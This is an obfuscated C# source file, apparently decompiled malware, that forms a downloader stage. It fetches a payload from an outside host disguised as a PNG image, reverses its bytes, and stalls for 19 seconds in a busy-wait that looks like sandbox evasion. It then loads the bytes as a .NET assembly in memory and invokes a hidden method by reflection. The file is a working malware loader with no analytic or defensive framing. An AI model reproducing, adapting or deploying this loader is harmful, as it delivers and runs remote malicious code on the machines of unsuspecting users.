using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using H5xM9bidBYFZrWjgMk;

namespace XaxHpvoCcJ7jC8j4T7;

internal static class nlct307Nyebc7cw5O0
{
	private static ConcurrentQueue<object> ECcVJ7jC8;

	private static byte[] C7iD3DXP3()
	{
		return Jyhtlct30(QO0S8axHp("http://thddghdd2.com/Gallvkkn_Sdycsait.png"));
	}

	internal static void z5U7d06i3()
	{
		ECcVJ7jC8.Enqueue(Assembly.Load(C7iD3DXP3()));
	}

	internal static void JAQojPRpl()
	{
		object result = new object();
		if (ECcVJ7jC8.TryDequeue(out result))
		{
			Assembly assembly = result as Assembly;
			ECcVJ7jC8.Enqueue(assembly.GetType("Cwdnbwluarm.Oyybldqjhkkxqmseionpslcv"));
		}
	}

	private static byte[] Jyhtlct30(byte[] byte_0)
	{
		object obj = new object();
		Dictionary<int, byte> dictionary = new Dictionary<int, byte>();
		int num = byte_0.Length;
		while (num-- > 0)
		{
			lock (obj)
			{
				dictionary.Add(num, byte_0[num]);
			}
		}
		DateTime dateTime = DateTime.Now.AddSeconds(19.0);
		while (dateTime > DateTime.Now)
		{
		}
		return dictionary.Values.ToArray();
	}

	internal static void KyeQbc7cw()
	{
		if (ECcVJ7jC8.TryDequeue(out var result))
		{
			Type type = result as Type;
			ECcVJ7jC8.Enqueue(type.InvokeMember("Huhnmohn", BindingFlags.InvokeMethod, null, null, null));
		}
	}

	internal static byte[] QO0S8axHp(string string_0)
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_0);
		using HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		byte[] array = new byte[1024];
		MemoryStream memoryStream = new MemoryStream();
		using Stream stream = httpWebResponse.GetResponseStream();
		int num = 0;
		do
		{
			num = stream.Read(array, 0, array.Length);
			memoryStream.Write(array, 0, num);
		}
		while (num != 0);
		return memoryStream.ToArray();
	}

	static nlct307Nyebc7cw5O0()
	{
		qMB23eUYWYHTl2dWWN.FP1BwqYKalBqv();
		ECcVJ7jC8 = new ConcurrentQueue<object>();
	}
}
